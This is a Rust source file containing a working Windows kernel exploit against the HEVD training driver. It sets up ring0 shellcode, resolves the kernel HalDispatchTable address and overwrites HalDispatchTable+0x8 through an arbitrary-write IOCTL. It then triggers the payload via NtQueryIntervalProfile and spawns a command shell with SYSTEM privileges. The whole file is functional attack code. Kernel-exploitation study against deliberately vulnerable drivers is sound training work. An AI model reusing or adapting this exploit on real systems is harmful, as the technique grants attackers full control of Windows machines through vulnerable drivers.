#![allow(dead_code)]
use std::{ffi::c_void, mem::size_of};

use exploitation::{
    build_shellcode, get_device_handle, get_driver_base_address, get_function_address_by_name,
    is_elevated, send_io_control, spawn_shell, trigger_payload, DEVICE_NAME,
    HEVD_IOCTL_ARBITRARY_OVERWRITE,
};

#[derive(Debug, Clone, Copy)]
pub struct WriteWhatWhere {
    what_value: *mut c_void,
    where_value: *mut c_void,
}

pub fn exploit_without_kcfg() {
    /* Generate payload */
    let ring0_payload_addy = match build_shellcode() {
        Ok(payload) => payload,
        Err(e) => panic!("[-] Failed to setup payload: {}", e),
    };

    let ring0_payload_ptr_addy = &ring0_payload_addy as *const _;
    println!(
        "\t[*] Ring0 Payload Address (VirtualAlloc): {:p}",
        ring0_payload_addy
    );
    println!(
        "\t[*] Ring0 Payload Pointer Address (Ptr to VirtualAlloc Memory): {:p}",
        ring0_payload_ptr_addy
    );

    println!("[+] Gathering Kernel Information");

    let ntoskrnl_kernel_addy = match get_driver_base_address("ntoskrnl.exe") {
        Ok(address) => address,
        Err(e) => panic!("[-] Failed to get ntoskrnl.exe base address: {}", e),
    };

    println!("\t[*] Loaded Kernel: ntoskrnl.exe");
    println!("\t[*] Base Address: {:#x}", ntoskrnl_kernel_addy);

    println!("[+] Resolving HalDispatchTable");

    let (ntoskrnl_user_addy, mut hal_dispatch_address) =
        match get_function_address_by_name("ntoskrnl.exe\0", "HalDispatchTable\0") {
            Ok((ntoskrnl_addy, hal_addy)) => (ntoskrnl_addy, hal_addy),
            Err(e) => panic!("[-] Failed to get HalDispatchTable address: {}", e),
        };

    println!(
        "\t[*] User Mode HalDispatchTable Address: {:#x}",
        hal_dispatch_address
    );

    /* Subtract ntoskrnl base in user mode to get the offset */
    hal_dispatch_address -= ntoskrnl_user_addy as u64;
    println!("\t[*] HalDispatchTable Offset: {:#x}", hal_dispatch_address);

    /* To find HalDispatchTable address in kernel land add the base of ntoskrnl in kernel land */
    hal_dispatch_address += ntoskrnl_kernel_addy as u64;
    println!(
        "\t[*] Kernel Mode HalDispatchTable Address: {:#x}",
        hal_dispatch_address
    );

    /* Add + 0x8 to find HalDispatchTable+0x8 (x86_64 is 8 bytes instead of 4) */
    let hal_dispatch_address_plus_8 = hal_dispatch_address + 0x8;
    println!(
        "\t[*] HalDispatchTable + 0x8: {:#x}",
        hal_dispatch_address_plus_8
    );

    /* Prepare the buffer that needs to be sent to the */
    println!("[+] Write-What-Where Structure");
    let write_what_where = WriteWhatWhere {
        what_value: ring0_payload_ptr_addy as _,
        where_value: hal_dispatch_address_plus_8 as _,
    };

    let write_what_where_ptr = &write_what_where as *const _ as *const c_void;
    let buffer_size: u32 = size_of::<WriteWhatWhere>() as u32;
    println!("\t[*] What: {:p}", write_what_where.what_value);
    println!("\t[*] Where: {:p}", write_what_where.where_value);

    /* Get a handle to the vulnerable kernel driver */
    println!("[+] Opening Vulnerable Device: {}", DEVICE_NAME);
    let device_handle = match get_device_handle(DEVICE_NAME) {
        Ok(handle) => handle,
        Err(e) => panic!("[-] Failed to get device handle: {}", e),
    };
    println!("\t[*] Device Handle: {:#x}", device_handle);

    /* Send the control code with buffer to the vulnerable driver */
    println!("[+] Triggering Arbitrary Memory Overwrite");
    println!("\t[*] Buffer: {:?}", write_what_where);
    println!("\t[*] Buffer Length: {}", buffer_size);
    println!(
        "\t[*] Sending IOCTL Code: {:#x}",
        *HEVD_IOCTL_ARBITRARY_OVERWRITE
    );

    match send_io_control(
        device_handle,
        *HEVD_IOCTL_ARBITRARY_OVERWRITE,
        write_what_where_ptr as _,
        buffer_size,
    ) {
        Ok(_) => println!("\t[*] Successfully Sent IOCTL"),
        Err(e) => panic!("[-] Failed to send IOCTL: {}", e),
    };

    println!("[+] Triggering Ring0 Payload");

    /* Trigger payload by calling NtQueryIntervalProfile inside ntdll.dll */
    match trigger_payload("NtQueryIntervalProfile\0") {
        Ok(_) => println!("\t[*] Successfully Triggered Payload"),
        Err(e) => panic!("[-] Failed to trigger payload: {}", e),
    }

    /* If we are here, it means that we've survived a BSOD */
    println!("[+] Checking Current Process Privileges");

    let _csrss_handle = match is_elevated("csrss.exe") {
        Ok(_) => println!("\t[*] Successfully Elevated Privileges"),
        Err(e) => panic!("[-] Current Process is not Elevated: {}", e),
    };

    /* we have successfully elevated our privileges */
    println!("[+] Spawning CMD with SYSTEM Privilege");
    let _pid = match spawn_shell() {
        Ok(_) => println!("[+] W00TW00T NT AUTHORITY\\SYSTEM"),
        Err(e) => panic!("[-] Failed to spawn CMD: {}", e),
    };
}
